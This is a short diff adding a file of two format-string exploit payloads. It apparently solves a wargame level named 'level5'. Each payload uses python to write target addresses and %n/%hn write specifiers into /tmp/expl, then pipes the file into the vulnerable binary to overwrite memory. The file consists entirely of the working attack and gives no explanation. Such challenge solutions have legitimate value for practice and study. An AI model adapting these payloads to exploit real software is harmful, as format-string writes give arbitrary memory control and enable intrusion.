@@ -1,0 +1,8 @@
+V1
+python -c 'print "\x38\x98\x04\x08" + "%134513824c%4\$n"' > /tmp/expl
+
+V2
+python -c 'print "\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044c%4$hn" + "%31904c%5$hn"' > /tmp/expl
+
+
+cat /tmp/expl - | ./level5
